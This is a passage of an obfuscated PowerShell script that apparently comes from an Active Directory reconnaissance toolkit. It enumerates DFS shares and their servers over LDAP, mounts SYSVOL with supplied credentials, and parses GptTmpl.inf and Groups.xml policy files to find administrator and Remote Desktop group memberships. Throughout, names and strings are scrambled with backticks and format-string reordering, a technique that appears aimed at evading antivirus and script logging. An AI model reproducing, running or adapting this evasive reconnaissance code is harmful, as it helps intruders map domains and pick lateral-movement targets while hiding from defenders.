                        ${s`hoRT_prE`Fix} =  ${O`ZDI}::"UN`ic`ode"."GE`T`S`TriNG"(${bL`Ob`_dATa}[${shor`T_pRefI`x_`STaRT}..${S`Hor`T_pr`efi`x_ENd}])

                        ${TyP`E`_STa`RT} = ${ShoR`T_`P`ReFIx_END} + 1
                        ${tyPe`_`EnD} = ${Ty`P`E_ST`ArT} + 3
                        ${t`ypE} =  (&("{1}{2}{0}{3}" -f'b','get-va','RIA','le') ('3'+'57')  -vALUeON)::"TO`Ui`Nt32"(${B`Lob_`dATA}[${ty`pE`_sta`Rt}..${T`Y`pE_eNd}],0)

                        ${stAte`_S`TARt} = ${T`Yp`E_END} + 1
                        ${sTA`T`E_end} = ${S`TatE`_st`ART} + 3
                        ${S`TAte} =   ${3`57}::"to`UInt32"(${b`lOb_D`AtA}[${sTA`Te_`ST`ARt}..${StaT`E`_end}],0)

                        ${C`omm`ent_siZE_s`TaRT} = ${s`TATE_e`ND} + 1
                        ${C`OMmEN`T_sIze`_eNd} = ${cO`Mm`ent_sizE`_st`ARt} + 1
                        ${co`MmE`NT`_s`izE} =  ( &("{2}{1}{0}"-f 'lE','RIab','Va')  357 -VALu )::"T`OUi`Nt16"(${Bl`ob_`DatA}[${C`oMm`ENt_siZ`E_StArT}..${ComM`enT`_s`i`Ze_`eNd}],0)
                        ${c`O`MM`enT_StART} = ${cO`mME`NT_`si`ZE_e`Nd} + 1
                        ${c`oMM`eNt`_eNd} = ${co`MME`NT_`s`TarT} + ${co`mMEnT_`sIze} - 1
                        if (${co`Mm`E`Nt_sIZE} -gt 0)  {
                            ${CoMM`E`NT} =   (  &("{2}{1}{0}" -f 'e','ABL','VarI')  ("o"+"ZdI")  )."v`AlUe"::"un`ICOde"."gE`TSTR`iNG"(${Blob_`D`ATA}[${C`oMMEn`T_St`A`RT}..${COMme`Nt_`enD}])
                        }
                        ${pRe`FiX`_`TIMeStAmP_`start} = ${coMMEN`T`_EnD} + 1
                        ${p`R`ef`iX_tIm`ES`TAMp_ENd} = ${pREF`i`X_tIMestA`mp`_`St`A`Rt} + 7
                        
                        ${pREFi`x`_T`ImEsTA`MP} = ${B`LO`B_dAta}[${pR`eF`IX`_tI`MeSTaM`p`_StARt}..${pre`F`Ix_t`imes`TAMP_E`ND}] 
                        ${ST`A`TE`_timESTAmP_`S`T`ARt} = ${prE`F`I`x_tImES`TaM`p_end} + 1
                        ${STatE`_`T`i`mEstaMP_enD} = ${s`TaTE_tI`mE`sTAMP_sT`ART} + 7
                        ${sta`TE_T`iMESt`AmP} = ${Blob_`d`AtA}[${sT`AtE_T`iMeSt`A`Mp_`STArT}..${s`TaTE`_Ti`mEStAmP_end}]
                        ${COMm`ENt_TiMES`Tamp`_sTA`RT} = ${STA`T`e_`Ti`MestA`mP_End} + 1
                        ${co`m`meNT_tIME`s`T`A`mp_ENd} = ${cOmMen`T`_TimE`STAmP_ST`Art} + 7
                        ${cO`MMen`T_T`I`MestAmP} = ${B`l`Ob_daTA}[${C`Omm`EnT_tImeStA`Mp_st`A`RT}..${c`oMMe`N`T_`TIMestamp_e`ND}]
                        ${v`Ersi`oN`_s`TART} = ${c`OmM`e`NT_`TiM`EST`AMP_eND}  + 1
                        ${v`ERsiO`N_`END} = ${vE`RsIon_stA`Rt} + 3
                        ${VeR`SioN} =  ( &("{3}{0}{2}{1}"-f 'R','ble','iA','GET-Va')  ('3'+'57')  -vaLUEOnL  )::"TO`Ui`NT32"(${b`L`Ob_`dAta}[${v`eR`sIOn_St`A`Rt}..${Ver`sIon`_e`Nd}],0)

                        
                        ${DFs_`TARgEtl`ISt_b`LOB_S`iZe_s`TARt} = ${Ve`RS`IOn_e`ND} + 1
                        ${D`FS_TaR`GETL`IsT_BLoB`_`S`Iz`e_EnD} = ${DfS`_TA`RgeTLi`s`T_blob_siZe`_sTarT} + 3
                        ${dFs_t`A`RGEt`lIsT_b`loB`_Size} =  (  &("{0}{1}"-f 'CHIldi','TeM') ('VAriA'+'blE:'+'357'))."va`LUe"::"TO`U`iNT32"(${b`L`oB_DAta}[${D`Fs_TargeTLIs`T_BlO`B`_S`iZ`e_s`T`ART}..${dF`s_tA`RGEtliS`T_BloB_s`i`Z`e_EnD}],0)

                        ${dFS`_TaRge`T`LisT_bLo`B_ST`A`RT} = ${dfs`_tArG`E`TliST_blob_`Siz`e_ENd} + 1
                        ${d`FS_TAr`getLISt_bl`o`B_EnD} = ${dfs_T`ARg`eTLISt`_b`LOB_s`T`ART} + ${dFs_targ`E`TLis`T_`BL`Ob_S`I`ze} - 1
                        ${dfS_tarG`Etl`IST_Bl`OB} = ${bLOb_`d`A`TA}[${D`Fs_t`AR`gETl`iST_bL`ob_stART}..${Dfs`_tA`R`Get`LIs`T_BL`o`B_eNd}]
                        ${resErV`ed_`BLob_S`Iz`E`_`S`TART} = ${Dfs_tArgeT`L`Is`T_blOb_`e`ND} + 1
                        ${RE`SerVed`_BLob`_Si`Ze_`end} = ${RESErV`e`d_bLOB_Siz`E_S`Tart} + 3
                        ${RE`seRVeD`_bloB`_s`IZE} =   ${3`57}::"tOuI`N`T32"(${BL`o`B_dAtA}[${ReserV`Ed_bLOb_SIZ`e_s`Ta`RT}..${rESErVEd_blO`B_`S`i`Ze`_`EnD}],0)

                        ${R`Es`er`Ved_blOB_StarT} = ${ReSe`RVEd`_`BlOB_Si`ZE`_eND} + 1
                        ${rEsErveD_`BL`ob_`END} = ${Re`sE`Rve`d_BL`Ob_S`TaRT} + ${re`S`ER`V`ED_b`lob_SIzE} - 1
                        ${rES`ErvEd_bl`OB} = ${b`LOb_d`A`Ta}[${rEseR`VED_b`LoB`_STa`Rt}..${R`ese`RvE`D_BL`ob_ENd}]
                        ${rEFer`R`A`l_TT`l_StArt} = ${reServed`_`BL`oB_ENd} + 1
                        ${refEr`Ra`l`_tTL`_`eNd} = ${ReFeRr`A`L`_TTl_`STArT} + 3
                        ${RefeR`R`AL_tTL} =   ${3`57}::"TOui`Nt`32"(${Blob`_D`ATa}[${RefErRaL_`T`Tl_S`TaRt}..${REFE`Rr`Al`_`T`TL_enD}],0)

                        
                        ${TaRG`ET_CouN`T_`S`TaRt} = 0
                        ${tArgET_co`U`N`T_E`ND} = ${t`AR`Ge`T_`CounT`_START} + 3
                        ${TaRgE`T`_cOUNt} =  ${3`57}::"To`UI`Nt32"(${DFS_`TaRg`e`TL`IsT_blOB}[${T`ARget_`cOu`N`T_sT`Art}..${TarGe`T_`Co`Unt_e`ND}],0)
                        ${T_O`FF`SeT} = ${tARgET_cO`UnT`_`EnD} + 1

                        for(${j}=1; ${j} -le ${t`ArgET`_COUnt}; ${j}++){
                            ${TAR`GET`_entRy_`Size`_`stArt} = ${t`_`offS`eT}
                            ${TAR`gEt_entRy_`SI`ze_`End} = ${t`AR`GET_`EN`TRy`_SI`Z`e_stArT} + 3
                            ${t`ARg`e`T_en`Try_siZE} =   ${3`57}::"TouInT`32"(${DfS_`TAr`gEt`liST_`BL`ob}[${tA`Rg`et_EnTR`Y_size_ST`ArT}..${TaRgE`T_ENt`Ry_`S`Ize_EnD}],0)
                            ${TARG`E`T_`TI`Me_STA`mp_`sTARt} = ${TarGe`T_e`NTr`y_SIZ`e_`enD} + 1
                            ${tArG`Et_`TiMe`_sT`AMp_eNd} = ${T`A`R`G`eT_TIMe_StAmp_`STa`Rt} + 7
                            
                            ${taRGE`T_tiMe_`s`T`Amp} = ${d`F`s_t`ARg`etLIst_`BlOB}[${tA`RgEt_Time_`STAmP`_s`TArt}..${TARge`T_TIMe`_sTAM`P_e`Nd}]
                            ${T`A`RGeT_STA`TE_STArt} = ${targE`T`_time_sta`M`p_E`Nd} + 1
                            ${T`A`RGET`_sTA`T`e_EnD} = ${T`Arg`et_Stat`E`_st`ARt} + 3
                            ${t`ArgET_sT`ATE} =  ( &("{0}{1}"-f 'vaRiA','BlE')  ("35"+"7")  -va)::"TOU`i`Nt32"(${dfs_`T`ArG`E`TLI`ST_BlOB}[${TaRGE`T_Sta`T`E_staRT}..${tAr`GET_`state`_end}],0)

                            ${tarGe`T_TYp`e_St`ARt} = ${t`ARgEt`_Stat`e_E`ND} + 1
                            ${TARge`T_ty`p`E_ENd} = ${TargEt_`TYPe_`sT`ARt} + 3
                            ${T`ARGE`T_Ty`Pe} =   (&('gI')  ("{1}{0}{2}{3}" -f'r','vA','IAb','LE:357'))."vA`luE"::"ToUI`N`T32"(${DFS`_tAr`GetL`iST`_bloB}[${taRG`e`T_TypE_`sTArT}..${TarGEt`_Ty`Pe_`ENd}],0)

                            ${S`Er`VE`R_namE_SIz`e_sTaRt} = ${T`Ar`gET_TyPE_E`Nd} + 1
                            ${S`eRV`Er_nAmE_`s`IzE_E`Nd} = ${se`RVer`_NAMe_sI`Ze`_StaRT} + 1
                            ${SEr`Ver_`NAMe_`sI`ze} =   ( &("{1}{0}" -f'cI','G') ("{3}{0}{2}{1}" -f'r','AblE:357','i','VA')  )."vAl`UE"::"tOui`Nt`16"(${dfS_t`A`Rget`List_BLob}[${S`ERvE`R_n`AMe_`sIZE_StArt}..${S`E`R`V`Er`_`NaMe_size_end}],0)

                            ${SEr`V`ER_`N`AME_s`TArT} = ${S`E`RVEr`_N`AME_sIZE_eND} + 1
                            ${seRVe`R_`N`AmE_eND} = ${sE`RVeR_`NaME`_`s`TARt} + ${S`erV`er_`NaME_`SIZE} - 1
                            ${SERvEr_`N`A`mE} =  (  &("{0}{1}" -f'D','iR')  ('vAR'+'i'+'aB'+'le:OZ'+'dI'))."V`ALuE"::"U`NiCODe"."GetSTRI`Ng"(${D`Fs`_target`li`st_BlOB}[${se`RVER_namE_`ST`ART}..${Se`RVEr_nAm`E_e`Nd}])

                            ${shAr`e`_`NA`Me_SiZE_ST`A`RT} = ${s`ErvER_NaME_e`Nd} + 1
                            ${sHa`Re_nAm`e`_size`_enD} = ${shAR`E_n`AME_Siz`E_s`T`A`Rt} + 1
                            ${ShA`R`e_NAmE_si`ze} =  (&('Ls') ("VARIaB"+"L"+"E:357") )."val`Ue"::"To`U`InT16"(${dFS`_`TARG`etli`St`_`Blob}[${Sh`ARe`_NAMe_sizE_`START}..${s`haRE_Name_`s`i`Ze_`END}],0)
                            ${S`hArE_n`A`ME_ST`ArT} = ${Sha`RE`_nAME_SIz`E_ENd} + 1
                            ${s`hARe`_NAm`E_EnD} = ${sHar`E_NAme`_`sT`ART} + ${ShA`Re_na`mE_`SiZE} - 1
                            ${sh`ArE_N`A`mE} =   (&("{0}{1}" -f'G','ci')  ("{2}{1}{0}{3}"-f ':OZd','ABlE','VaRi','i'))."VA`Lue"::"Un`IcOdE"."geT`StRI`NG"(${d`Fs_`Tar`g`eTli`ST`_bLOb}[${Share_n`A`me_St`ARt}..${S`H`ARe_na`ME`_eND}])

                            ${taRGE`T_l`ist} += "\\$server_name\$share_name"
                            ${t_o`FFs`ET} = ${Sh`Are_NaMe_E`Nd} + 1
                        }
                    }
                }
                ${O`FF`set} = ${blob_D`A`TA_`eNd} + 1
                ${dfS_pkT`_ProPERT`I`Es} = @{
                    ("{0}{1}"-f 'Nam','e') = ${B`Lob_N`AMe}
                    ("{1}{0}"-f 'x','Prefi') = ${PR`EFIX}
                    ("{2}{0}{1}" -f 'rgetLi','st','Ta') = ${TARG`Et_LI`St}
                }
                ${OBJect_l`I`St} += &("{1}{2}{0}"-f 't','New-Ob','jec') -TypeName ("{1}{2}{0}" -f'ject','PSO','b') -Property ${DFs`_P`K`T_`pRoPert`IEs}
                ${pR`eF`ix} = ${N`UlL}
                ${blOB_n`A`Me} = ${N`ULl}
                ${T`Arg`eT_lIST} = ${Nu`ll}
            }

            ${s`ErvERS} = @()
            ${o`B`jeC`T_lISt} | &("{4}{2}{1}{0}{3}"-f'ec','-Obj','ch','t','ForEa') {
                if (${_}."TARGETL`i`St") {
                    ${_}."T`A`RgEtlIsT" | &("{2}{0}{1}{3}"-f'orEa','c','F','h-Object') {
                        ${ser`VeRs} += ${_}.("{0}{1}"-f'sp','lit').Invoke('\')[2]
                    }
                }
            }

            ${se`Rve`RS}
        }

        function GET`-`DOMA`InDfSSHarE`V1 {
            [CmdletBinding()]
            Param(
                [String]
                ${DomA`iN},

                [String]
                ${s`e`AR`CHBAse},

                [String]
                ${seR`VEr},

                [String]
                ${Se`Archs`c`ope} = ("{1}{0}" -f 'ubtree','S'),

                [Int]
                ${Re`sUlt`P`AGe`sizE} = 200,

                [Int]
                ${sEr`VerTI`MEL`imIT},

                [Switch]
                ${tOM`BsTo`Ne},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${CrED`eN`TIal} =   (&("{0}{3}{1}{2}" -f'GEt-vA','a','BLe','rI')  ('5R0v'+'K') -VaLuEOn  )::"Em`pTY"
            )

            ${dF`sSE`ARcHeR} = &("{0}{3}{2}{5}{4}{1}"-f'Ge','her','DomainS','t-','arc','e') @PSBoundParameters

            if (${dFSS`EArc`h`er}) {
                ${DfsS`ha`RES} = @()
                ${d`FSs`eaRc`HEr}."FI`ltEr" = (("{4}{1}{2}{0}{3}{5}" -f 'ss=f','bject','Cla','TDfs)','(&(o',')'))

                try {
                    ${Re`S`UltS} = ${DFSse`ArCH`Er}.("{2}{0}{1}"-f 'A','ll','Find').Invoke()
                    ${Re`S`ULTs} | &("{2}{0}{3}{1}"-f'h','bject','W','ere-O') {${_}} | &("{3}{2}{0}{1}"-f'Each-Ob','ject','r','Fo') {
                        ${p`Ro`P`eRtIes} = ${_}."pR`O`Per`TiEs"
                        ${ReMo`TeNam`ES} = ${Pro`pERT`I`Es}."REMOTeS`E`RVerN`A`me"
                        ${p`kt} = ${pr`oPerti`ES}."p`Kt"

                        ${D`FSSHar`es} += ${re`MoT`enAM`eS} | &("{3}{0}{1}{2}"-f'Eac','h-Obje','ct','For') {
                            try {
                                if ( ${_}.("{0}{1}" -f'C','ontains').Invoke('\') ) {
                                    &("{1}{2}{0}"-f 't','New-Obj','ec') -TypeName ("{2}{1}{0}" -f 'ct','bje','PSO') -Property @{("{1}{0}" -f'ame','N')=${PRO`P`erTiES}."N`Ame"[0];("{2}{0}{3}{1}{4}" -f 'e','teServe','R','mo','rName')=${_}.("{0}{1}"-f'sp','lit').Invoke('\')[2]}
                                }
                            }
                            catch {
                                &("{4}{0}{1}{2}{3}"-f 'r','ite-Ve','rbos','e','W') ('['+'Get-D'+'omainDFSShare'+'] '+'Ge'+'t-Domai'+'nD'+'FSSha'+'reV1 '+'e'+'rror '+'i'+'n '+'p'+'arsing '+'D'+'FS '+'s'+'hare '+': '+"$_")
                            }
                        }
                    }
                    if (${re`s`UltS}) {
                        try { ${R`esUlts}.("{1}{0}"-f 'ose','disp').Invoke() }
                        catch {
                            &("{0}{1}{3}{2}"-f'Write','-Ve','se','rbo') ('[Get-D'+'oma'+'inDF'+'S'+'S'+'hare] '+'Get'+'-'+'Domain'+'DFS'+'Sha'+'reV1'+' '+'e'+'r'+'ror '+'di'+'s'+'posing'+' '+'o'+'f '+'th'+'e '+'Resul'+'ts'+' '+'obj'+'ect'+': '+"$_")
                        }
                    }
                    ${d`Fs`sea`RcheR}.("{1}{0}" -f 'pose','dis').Invoke()

                    if (${p`kT} -and ${P`kt}[0]) {
                        &("{2}{0}{1}"-f 'rse-Pk','t','Pa') ${p`kT}[0] | &("{2}{1}{0}" -f 't','ch-Objec','ForEa') {
                            
                            
                            
                            if (${_} -ne ("{1}{0}"-f 'l','nul')) {
                                &("{2}{1}{0}" -f 'bject','ew-O','N') -TypeName ("{1}{0}" -f't','PSObjec') -Property @{("{0}{1}" -f'Na','me')=${p`ROPeRti`eS}."nA`me"[0];("{0}{3}{2}{4}{1}" -f 'R','me','oteServer','em','Na')=${_}}
                            }
                        }
                    }
                }
                catch {
                    &("{2}{1}{0}"-f'ng','rite-Warni','W') ('['+'G'+'et-D'+'oma'+'inDFSSh'+'are] '+'Get-'+'Do'+'m'+'ai'+'nDFSShareV1 '+'error'+' '+': '+"$_")
                }
                ${d`FSS`hAreS} | &("{1}{0}{2}"-f 'O','Sort-','bject') -Unique -Property ("{3}{2}{1}{0}{4}" -f'r','oteSe','em','R','verName')
            }
        }

        function geT-DOM`AiN`DFSs`hAR`Ev2 {
            [CmdletBinding()]
            Param(
                [String]
                ${d`oMaIn},

                [String]
                ${s`e`ARChbA`Se},

                [String]
                ${S`ERVeR},

                [String]
                ${SEarc`HScO`pE} = ("{0}{1}"-f 'Su','btree'),

                [Int]
                ${ReSulTp`A`G`ESize} = 200,

                [Int]
                ${se`RvERtImeLIm`It},

                [Switch]
                ${t`oMbs`Tone},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${CreDent`i`Al} =   ${5`R0VK}::"E`mPtY"
            )

            ${DF`ssEa`RC`hEr} = &("{1}{0}{3}{4}{5}{2}"-f'et-Do','G','r','m','ainS','earche') @PSBoundParameters

            if (${DfSSE`A`RcH`ER}) {
                ${DFs`S`ha`Res} = @()
                ${dfs`sE`Ar`chEr}."Fil`T`ER" = ("{3}{6}{0}{1}{7}{2}{5}{4}" -f 'las','s=','s','(&(','inkv2))','DFS-L','objectC','m')
                ${N`Ull} = ${dfs`SEarC`H`er}."p`Ro`pErtiE`S`TolOaD".("{1}{2}{0}" -f'ange','Add','R').Invoke((("{2}{4}{3}{1}{0}"-f'2','nkpathv','msdfs-','i','l'),("{4}{2}{3}{0}{1}" -f'L','istv2','arg','et','msDFS-T')))

                try {
                    ${reS`U`lTS} = ${D`F`ssEaRCHER}.("{1}{0}" -f'All','Find').Invoke()
                    ${ReS`Ul`TS} | &("{1}{2}{0}"-f 'bject','Where','-O') {${_}} | &("{0}{2}{1}{3}" -f 'ForEach-Obj','c','e','t') {
                        ${pROPE`RT`i`eS} = ${_}."pr`Op`ER`TIEs"
                        ${TARg`E`T_li`St} = ${PrOp`ErT`ieS}.'msdfs-targetlistv2'[0]
                        ${X`mL} = [xml] (  &("{0}{1}"-f'G','ci')  ("{0}{4}{1}{3}{2}" -f 'var','bLE','OZdI',':','ia')  )."Va`Lue"::"u`NiCODE"."G`E`TStriNg"(${Ta`Rg`Et_`lIST}[2..(${ta`RgeT_`lisT}."L`eng`TH"-1)])
                        ${DFSs`hA`Res} += ${X`ml}."TA`RGe`Ts"."CHi`LDN`odES" | &("{2}{0}{3}{1}" -f'ach','bject','ForE','-O') {
                            try {
                                ${tAr`g`Et} = ${_}."I`N`NeRTEXT"
                                if ( ${T`ARGET}.("{0}{1}{2}" -f'Co','ntai','ns').Invoke('\') ) {
                                    ${DFs`ROoT} = ${Ta`Rget}.("{1}{0}"-f'plit','s').Invoke('\')[3]
                                    ${SH`AREn`AMe} = ${PRoP`e`RTI`Es}.'msdfs-linkpathv2'[0]
                                    &("{0}{2}{1}"-f 'Ne','-Object','w') -TypeName ("{1}{2}{0}"-f 'ect','PSO','bj') -Property @{("{0}{1}"-f'Na','me')="$DFSroot$ShareName";("{3}{1}{2}{0}"-f'rverName','ote','Se','Rem')=${TAr`g`et}.("{0}{1}"-f'sp','lit').Invoke('\')[2]}
                                }
                            }
                            catch {
                                &("{4}{0}{2}{3}{1}"-f 'e-V','se','e','rbo','Writ') ('[Get-Doma'+'in'+'DF'+'S'+'Share]'+' '+'G'+'et-'+'Dom'+'ainDF'+'S'+'ShareV2 '+'er'+'ro'+'r '+'i'+'n '+'pa'+'r'+'sing '+'t'+'ar'+'get '+': '+"$_")
                            }
                        }
                    }
                    if (${Res`UL`TS}) {
                        try { ${R`eSULTS}.("{1}{0}{2}"-f'ispos','d','e').Invoke() }
                        catch {
                            &("{1}{0}{3}{2}"-f 'r','Write-Ve','se','bo') ('[Get-Do'+'m'+'a'+'i'+'nDFSShar'+'e]'+' '+'E'+'rr'+'or '+'d'+'isposin'+'g '+'of'+' '+'t'+'he '+'Re'+'s'+'ults '+'object:'+' '+"$_")
                        }
                    }
                    ${DFsSeaR`c`HER}.("{1}{0}{2}" -f'spos','di','e').Invoke()
                }
                catch {
                    &("{2}{1}{0}"-f 'ng','ni','Write-War') ('[Get-Do'+'mainDF'+'S'+'Share]'+' '+'Get-'+'D'+'omainD'+'FSShareV2 '+'e'+'rr'+'or '+': '+"$_")
                }
                ${DfS`ShAR`Es} | &("{2}{1}{0}{3}" -f 'bjec','rt-O','So','t') -Unique -Property ("{2}{1}{3}{0}{4}" -f'rNam','emote','R','Serve','e')
            }
        }
    }

    PROCESS {
        ${dF`sS`HARes} = @()

        if (${PSBoUN`D`P`Ara`mETERS}[("{0}{1}" -f 'Doma','in')]) {
            ForEach (${taR`GETDom`AiN} in ${d`O`mAiN}) {
                ${s`EArC`HERArGu`menTs}[("{1}{0}{2}" -f'o','D','main')] = ${T`ARGetd`O`Main}
                if (${Ve`R`SiON} -match ((("{0}{1}"-f'a','ll{0}1'))  -F  [chaR]124)) {
                    ${dfSshA`R`eS} += &("{1}{2}{0}{3}{4}" -f 'ainDFSSh','Get-D','om','a','reV1') @SearcherArguments
                }
                if (${VeRs`iON} -match ((("{1}{0}" -f 'llVh62','a'))."REpLA`CE"('Vh6',[sTRInG][chaR]124))) {
                    ${Df`sS`haRES} += &("{3}{1}{6}{2}{0}{4}{5}" -f 'DFSShar','-','ain','Get','eV','2','Dom') @SearcherArguments
                }
            }
        }
        else {
            if (${VeRs`ion} -match ((("{0}{1}" -f'all{0}','1')) -F [ChAr]124)) {
                ${dF`SSH`ARES} += &("{2}{3}{0}{1}{4}" -f 'i','nDF','Get-Do','ma','SShareV1') @SearcherArguments
            }
            if (${v`E`RSIon} -match (('allTSx2').("{0}{1}" -f 'rEPL','Ace').Invoke('TSx','|'))) {
                ${DFSSh`Ar`es} += &("{2}{0}{1}{3}" -f't-D','omainDFSS','Ge','hareV2') @SearcherArguments
            }
        }

        ${D`FS`SHA`Res} | &("{2}{1}{0}" -f 't','ec','Sort-Obj') -Property (("{4}{2}{1}{3}{0}" -f'rverName','teS','o','e','Rem'),("{1}{0}"-f'me','Na')) -Unique
    }
}








function get`-`GptTMpl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}" -f 's','PSShouldP','roces'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(MAndaTOry = ${t`RUE}, vALUefRoMPiPeLine = ${T`RUe}, vAlUeFroMPiPeliNEbypROpeRTynAmE = ${tR`UE})]
        [Alias({"{0}{1}{2}" -f'g','pcfilesyspat','h'}, {"{1}{0}" -f'ath','P'})]
        [String]
        ${g`pT`TmpLpA`TH},

        [Switch]
        ${OU`TPUt`obJect},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`REdEN`TiAl} =   (&("{0}{1}"-f 'gC','i')  ("{2}{1}{0}{3}" -f'R0V','Le:5','VariAb','k') )."V`AluE"::"EMP`TY"
    )

    BEGIN {
        ${m`Ap`PeDpAthS} = @{}
    }

    PROCESS {
        try {
            if ((${gP`TTmP`L`Path} -Match ((("{2}{4}{1}{0}{3}"-f '5g.','.*D5gD','D5gD','*','5gD5gD5g'))-CREplaCe ([CHAr]68+[CHAr]53+[CHAr]103),[CHAr]92)) -and (${Psbo`UNdpaRA`Mete`RS}[("{1}{0}{2}{3}"-f'eden','Cr','ti','al')])) {
                ${s`y`svOL`PaTH} = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL "
                if (-not ${mAPPe`dpA`Ths}[${sYSvo`LpA`Th}]) {
                    
                    &("{0}{1}{4}{3}{2}" -f'Add-R','em','ion','nect','oteCon') -Path ${S`YsvoL`pATh} -Credential ${c`ReD`ENt`Ial}
                    ${MAp`pedP`A`Ths}[${sY`sV`oLpa`TH}] = ${tR`Ue}
                }
            }

            ${tARGET`gPt`T`MPlpath} = ${gpTt`mpL`PAtH}
            if (-not ${taR`G`e`T`GPT`TmPLPatH}.("{1}{0}{2}"-f'ndsWi','E','th').Invoke(("{0}{1}" -f '.in','f'))) {
                ${taRge`TGpt`TmpLp`ATH} += ((("{6}{16}{10}{1}{13}{8}{5}{4}{3}{14}{12}{0}{15}{7}{9}{11}{2}"-f 'c','r','tTmpl.inf','ows NTC','KcWind','ftC','CKcM','it','so','CKcG','HINECKcMic','p','cSe','o','K','Ed','AC'))."R`e`pLaCe"('CKc',[sTring][CHar]92))
            }

            &("{0}{2}{1}"-f 'Wr','te-Verbose','i') ('[G'+'e'+'t-GptTmpl]'+' '+'Parsin'+'g '+'Gp'+'tTmplPa'+'th:'+' '+"$TargetGptTmplPath")

            if (${PSbo`Un`DPaRA`MeTeRs}[("{2}{0}{1}" -f'Obje','ct','Output')]) {
                ${CoN`T`EnTS} = &("{2}{0}{1}"-f '-','IniContent','Get') -Path ${tARG`eT`GP`Tt`MPLpAth} -OutputObject -ErrorAction ("{1}{0}" -f 'top','S')
                if (${CO`Nte`NTs}) {
                    ${CON`Te`NTs} | &("{0}{1}{2}" -f'A','d','d-Member') ("{2}{1}{3}{0}"-f'erty','p','Note','rop') ("{1}{0}"-f 'ath','P') ${TaRGe`T`Gpt`TmPlPatH}
                    ${cO`NTE`NtS}
                }
            }
            else {
                ${CO`N`TENtS} = &("{1}{3}{2}{0}"-f'nt','Ge','nte','t-IniCo') -Path ${TarGET`gPt`TMPL`pATh} -ErrorAction ("{1}{0}"-f 'op','St')
                if (${cON`T`eNts}) {
                    ${C`ONtE`NTs}[("{0}{1}" -f'Pa','th')] = ${t`ARgET`gpTtmpLp`Ath}
                    ${cOnte`NTS}
                }
            }
        }
        catch {
            &("{1}{0}{2}{3}"-f'te','Wri','-Ver','bose') ('[Get-Gp'+'tTmpl]'+' '+'Er'+'ro'+'r '+'pars'+'i'+'ng '+"$TargetGptTmplPath "+': '+"$_")
        }
    }

    END {
        
        ${mAp`peD`pAThs}."K`EyS" | &("{1}{3}{0}{2}" -f 'ch-Ob','F','ject','orEa') { &("{1}{2}{0}{3}{5}{4}" -f 'Remot','Remo','ve-','eC','on','onnecti') -Path ${_} }
    }
}


function geT`-`gRouP`SxMl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{3}{0}{2}" -f'Proce','PS','ss','Should'}, '')]
    [OutputType({"{3}{0}{2}{1}{4}" -f'V','oups','iew.Gr','Power','XML'})]
    [CmdletBinding()]
    Param (
        [Parameter(MandatoRY = ${TR`Ue}, vALuEfRoMPipelIne = ${tr`Ue}, vALuefrOmpiPelINebYPrOpErtYnAme = ${T`RuE})]
        [Alias({"{0}{1}" -f'Pat','h'})]
        [String]
        ${g`ROU`P`sxMLpatH},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`eDE`Nt`iaL} =  ( &("{0}{1}{2}" -f 'VaRi','aBL','E')  ("5"+"r0VK")  -Va  )::"e`mPTy"
    )

    BEGIN {
        ${M`A`ppedpATHs} = @{}
    }

    PROCESS {
        try {
            if ((${GroU`p`S`xMLP`ATH} -Match ((("{1}{4}{0}{3}{2}" -f'W','8','W.*','8xW8xW.*8xW8x','xW8x'))-RePLace '8xW',[cHAR]92)) -and (${P`sBoUnD`parA`MeTeRs}[("{2}{1}{0}{3}" -f 'tia','en','Cred','l')])) {
                ${sY`sVol`P`AtH} = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL "
                if (-not ${MaPP`eD`PAt`Hs}[${SY`s`VoLpA`TH}]) {
                    
                    &("{0}{5}{3}{1}{4}{2}"-f'Add','oteCon','ion','Rem','nect','-') -Path ${SysV`ol`pA`TH} -Credential ${cr`edEnt`IaL}
                    ${mAp`P`EdpAt`Hs}[${sYs`VOLP`A`TH}] = ${T`RUE}
                }
            }

            [XML]${g`R`o`UpsX`mlCONT`ent} = &("{3}{2}{1}{0}"-f 't','nten','t-Co','Ge') -Path ${G`RouPS`xMlpA`Th} -ErrorAction ("{0}{1}"-f'S','top')

            
            ${G`RoUps`xmL`CoNTE`Nt} | &("{3}{1}{2}{0}"-f'ct-Xml','e','le','S') ("{1}{0}{3}{2}" -f 's/','/Group','p','Grou') | &("{0}{2}{1}"-f'Select-Ob','ct','je') -ExpandProperty ("{1}{0}" -f'de','no') | &("{0}{2}{1}"-f'For','ct','Each-Obje') {

                ${gr`Oupn`AMe} = ${_}."pr`oPe`RtI`Es"."gROu`pN`Ame"

                
                ${grOu`Ps`id} = ${_}."pR`Op`E`RtIeS"."gROup`S`Id"
                if (-not ${gr`OUP`sId}) {
                    if (${Grou`PN`AmE} -match ("{0}{2}{1}" -f 'A','ators','dministr')) {
                        ${GRO`UP`siD} = ("{1}{3}{0}{2}" -f'32-','S-1-5','544','-')
                    }
                    elseif (${G`RoupNa`Me} -match ("{2}{0}{3}{1}" -f 'mote D','p','Re','eskto')) {
                        ${gr`OuP`sId} = ("{2}{1}{0}" -f'-555','-5-32','S-1')
                    }
                    elseif (${g`Rou`pNAme} -match ("{0}{1}" -f'Gue','sts')) {
                        ${g`ROUps`ID} = ("{1}{2}{0}" -f '6','S-1','-5-32-54')
                    }
                    else {
                        if (${P`sBOUNDPAR`Am`eTE`Rs}[("{0}{2}{1}" -f'Cred','ial','ent')]) {
                            ${grOu`Ps`id} = &("{0}{1}{2}{3}"-f'Conv','ertTo-','S','ID') -ObjectName ${G`R`OUpNaME} -Credential ${cRe`d`E`NTIAl}
                        }
                        else {
                            ${gROu`pSId} = &("{2}{1}{0}{3}"-f 'To-S','t','Conver','ID') -ObjectName ${G`ROu`pNA`me}
                        }
                    }
                }

                
